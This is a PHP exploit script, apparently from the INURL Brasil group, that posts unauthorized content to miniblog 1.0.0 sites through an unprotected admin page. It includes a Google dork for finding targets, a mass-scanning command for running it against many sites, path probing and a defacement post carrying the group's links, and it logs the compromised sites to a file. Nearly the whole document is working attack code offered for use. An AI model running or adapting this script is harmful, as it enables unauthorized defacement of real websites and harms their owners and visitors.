<?php

/*
  [+] Discoverer Author: Mustafa Moshkela
  REF COD POC: http://www.exploit4arab.net/exploits/1482
  Greets to: all members in iq-team.org
  ------------------------------------------------------------------------------

  # SCRIPT by:     [ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]
  # EXPLOIT NAME:  XPL miniblog 1.0.0 CSRF 4ADD post / INURL BRASIL
  # AUTOR:         Cleiton Pinheiro / Nick: googleINURL
  # Email:         inurlbr@gmail.com
  # Blog:          http://blog.inurl.com.br
  # Twitter:       https://twitter.com/googleinurl
  # Fanpage:       https://fb.com/InurlBrasil
  # Pastebin       http://pastebin.com/u/Googleinurl
  # GIT:           https://github.com/googleinurl
  # PSS:           http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:       http://youtube.com/c/INURLBrasil
  # PLUS:          http://google.com/+INURLBrasil
  ------------------------------------------------------------------------------

  # DATA SUBMISSION WITHOUT VALIDATION 
  
  # Vendor:        http://www.spyka.net/scripts/php/miniblo

  # Google Dork:   intext:"Powered by miniblog" ext:php

  # POC:           http://{YOU_URL}/adm/admin.php?mode=add

  # SEND REQUEST POST
  adddata[post_title]=TITLE&data[post_content]=<b>YOU_POST</b>&data[published]=1&miniblog_PostBack=Add
  ------------------------------------------------------------------------------

  # EXECUTE:       php xpl.php -t http://target.us

  # FILE_OUTPUT :  miniblog_vuln.txt
  
  # EXPLOIT MASS USE SCANNER INURLBR
  php inurlbr.php --dork 'intext:"Powered by miniblog" ext:php' -s output.txt --command-all 'php xpl.php -t _TARGET_'
  More details about inurlbr scanner: https://github.com/googleinurl/SCANNER-INURLBR
  ------------------------------------------------------------------------------


 */
error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();

$op_ = getopt('f:t:', array('help::'));
echo "[+] [Exploit]: XPL miniblog 1.0.0 CSRF 4ADD post / INURL BRASIL\n";
$menu = "
    -t : SET TARGET.
    Execute:
                  php xpl.php -t target
\n";
echo isset($op_['help']) ? exit($menu) : NULL;
$params = array(
    'host' => not_isnull_empty($op_['t']) ? (strstr($op_['t'], 'http') ? $op_['t'] : "http://{$op_['t']}") : exit("\n[x] [ERRO] DEFINE TARGET!\n"),
    'line' => "--------------------------------------------------------------"
);

function __plus() {
    ob_flush();
    flush();
}

function not_isnull_empty($valor = NULL) {
    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

function __request($params) {
    $objcurl = curl_init();
    curl_setopt($objcurl, CURLOPT_URL, $params['host']);
    curl_setopt($objcurl, CURLOPT_USERAGENT, "Mozilla/" . rand(1, 50) . ".0 (compatible; MSIE " . rand(1, 50) . "." . rand(1, 50) . "1; Windows NT " . rand(1, 50) . ".0)");
    curl_setopt($objcurl, CURLOPT_POST, 1);
    curl_setopt($objcurl, CURLOPT_TIMEOUT, 5);
    # PUT YOUR HTML / data[post_content] = 'YOU_HTML'
    curl_setopt($objcurl, CURLOPT_POSTFIELDS, array(
        'data[post_title]' => 'INURL - BRASIL',
        'data[post_content]' => '<center>
        <img alt="Google INURL - Brasil" src="http://i.imgur.com/GQEOo5G.jpg" title="Google INURL - Brasil" width="700" height="1000" >
        <br><pre>
        [ + ] Blog:          http://blog.inurl.com.br
        [ + ] Twitter:       https://twitter.com/googleinurl
        [ + ] Fanpage:       https://fb.com/InurlBrasil
        [ + ] Pastebin       http://pastebin.com/u/Googleinurl
        [ + ] GIT:           https://github.com/googleinurl
        [ + ] PSS:           http://packetstormsecurity.com/user/googleinurl
        [ + ] YOUTUBE:       http://youtube.com/c/INURLBrasil
        [ + ] PLUS:          http://google.com/+INURLBrasil
        </pre><br><br><br><br><br>',
        'data[published]' => 1,
        'miniblog_PostBack' => 'Add'
    ));
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($objcurl, CURLOPT_FRESH_CONNECT, 1);

    $info['corpo'] = curl_exec($objcurl) . __plus();
    curl_close($objcurl) . __plus();
    unset($objcurl);
    return $info;
}

$pagtest = array('/miniblog/adm/admin.php?mode=add', '/adm/admin.php?mode=add', '/blog/adm/admin.php?mode=add');

foreach ($pagtest as $value) {
    $_h = get_headers($params['host'] . $value, 1);
    __plus();
    if ((strstr(($_h[0] . (isset($_h[1]) ? $_h[1] : NULL)), '200'))) {
        print "\n" . date("h:m:s") . " [INFO][COD]:: 200";
        $cle = str_replace("/adm/admin.php?mode=add",NULL,$params['host'].$value);
        print "\n" . date("h:m:s") . " [INFO][URL]:: {$cle} [ OK ]\n{$params['line']}\n";
        __request(array('host' => $params['host'] . $value));
        file_put_contents("miniblog_vuln.txt", "{$cle}\n\n", FILE_APPEND);
        __plus();
        exit();
    } else {

        print "\n" . date("h:m:s") . " [ERROR][URL]:: {$params['host']}{$value} [ NOT FOUND ]\n{$params['line']}\n";
    }
}
